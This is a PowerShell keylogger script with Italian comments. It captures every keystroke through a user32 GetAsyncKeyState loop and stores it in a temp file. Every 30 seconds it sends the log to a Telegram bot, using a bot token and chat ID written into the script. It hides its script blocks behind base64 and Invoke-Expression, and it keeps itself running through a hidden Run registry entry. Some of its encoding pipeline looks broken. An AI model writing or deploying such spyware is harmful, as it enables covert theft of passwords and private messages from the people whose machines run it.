# Configurazione Telegram
$botToken = "7636235608:AAFheAZoLU3edoN2_0IRzgmfMOrWST7pilQ"  # Token del bot
$chatId = "6550700163"  # Chat ID
$apiURL = "https://api.telegram.org/bot$botToken/sendMessage"

# Percorso del file temporaneo per salvare i log
$tempFile = "$env:TEMP\keylogs.txt"

# Crea il file temporaneo se non esiste
if (-Not (Test-Path $tempFile)) {
    New-Item -Path $tempFile -ItemType File -Force | Out-Null
}

# Funzione per catturare i tasti premuti
$encodedKeylogger = {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardTracker {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static string LogKeys() {
        string keys = "";
        for (int i = 0; i < 255; i++) {
            int keyState = GetAsyncKeyState(i);
            if (keyState == 1 || keyState == -32767) {
                keys += ((Keys)i).ToString() + " ";
            }
        }
        return keys;
    }
}
"@

    while ($true) {
        Start-Sleep -Milliseconds 100
        try {
            $keys = [KeyboardTracker]::LogKeys()
            if ($keys -ne "") {
                Add-Content -Path $tempFile -Value $keys
            }
        } catch {
            Start-Sleep -Seconds 5
        }
    }
} | Out-String | [System.Text.Encoding]::Unicode.GetBytes | [Convert]::ToBase64String

# Funzione per inviare i log a Telegram
$encodedSendLogs = {
    while ($true) {
        Start-Sleep -Seconds 30
        try {
            if (Test-Path $tempFile) {
                $logs = Get-Content -Path $tempFile -Raw
                $body = @{
                    chat_id = $chatId
                    text = $logs
                }
                $response = Invoke-WebRequest -Uri $apiURL -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
                if ($response.StatusCode -eq 200) {
                    Clear-Content -Path $tempFile
                }
            }
        } catch {
            Start-Sleep -Seconds 10
        }
    }
} | Out-String | [System.Text.Encoding]::Unicode.GetBytes | [Convert]::ToBase64String

# Decodifica ed esegui in memoria
Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedKeylogger)))
Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedSendLogs)))

# Persistenza: aggiungi al registro di avvio
if (-Not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Keylogger")) {
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keylogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $PSCommandPath" | Out-Null
}
